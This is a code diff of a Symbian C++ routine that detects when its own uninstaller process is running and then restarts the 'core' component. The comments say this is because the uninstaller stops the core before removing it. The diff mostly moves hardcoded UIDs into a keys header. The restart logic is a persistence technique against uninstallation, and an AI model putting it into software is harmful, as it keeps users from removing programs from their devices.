@@ -21,10 +21,19 @@
 #include <apgcli.h> 			// for RApaLsSession
 #include <apacmdln.h> 			// for CApaCommandLine
 
+#include "Keys.h"				// available in  Core/inc
+
 //  Local Functions
 
 LOCAL_C void MainL()
 {
+	// retrieve our uninstaller UID3
+	TBuf8<12> hexBuf(KUidUninstaller);
+	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
+	TLex8 lex(hexBuf);
+	TUint32 uid;
+	lex.Val(uid,EHex);
+		
 	// Let's check if our uninstaller is running
 	
 	TBool running(EFalse);
@@ -37,7 +46,7 @@ LOCAL_C void MainL()
 	   TInt err = ph.Open(res);
 	   if(err == KErrNone)
 		   {
-		   if(ph.SecureId() == 0x200305DB) 
+		   if(ph.SecureId() == uid) 
 			   { // SID of the process we are looking for: our uninstaller 
 			   running = ETrue;
 			   ph.Close();
@@ -77,8 +86,12 @@ LOCAL_C void MainL()
 		
 		// restart the core, since the uninstaller stops it before trying to uninstall
 		// and before we can catch it!
-		
-		TUid uid3 = {0x20030635};   // UID of our core
+		hexBuf.Copy(KUidCore);
+		hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
+		lex.Assign(hexBuf);
+		lex.Val(uid,EHex);
+		TUid uid3 = TUid::Uid(uid);
+			
 		const TUidType coreUid(KNullUid, KNullUid, uid3);
 		RProcess core;
 		CleanupClosePushL(core);
